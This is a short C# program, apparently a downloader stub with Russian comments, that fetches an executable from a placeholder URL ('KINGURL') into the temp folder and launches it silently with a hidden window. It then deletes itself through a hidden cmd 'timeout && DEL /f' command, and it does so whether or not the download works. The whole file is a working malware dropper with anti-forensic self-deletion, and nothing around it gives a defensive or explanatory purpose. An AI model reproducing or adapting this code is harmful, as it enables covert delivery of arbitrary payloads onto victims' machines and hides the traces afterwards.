using System;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace SimplyProgram
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            string remoteUrl = "KINGURL";
            string tempFilePath = Path.Combine(Path.GetTempPath(), "Program.exe");

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    // Скачивание файла по удаленному URL
                    webClient.DownloadFile(remoteUrl, tempFilePath);

                    // Запуск файла
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = tempFilePath,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(psi);

                    // Удаление текущего приложения

                    DelayDeleteFile(fileName, 1);
                }
            }
            catch
            {
                DelayDeleteFile(fileName, 1);
            }
        }


        private static void DelayDeleteFile(string fileName, int delaySecond = 2)
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                Verb = "runas", // If the program is an administrator permissions, then running CMD is also an administrator permissions
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true, // If you need to hide the window, set it to TRUE, you will not display the window
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }

    }
}
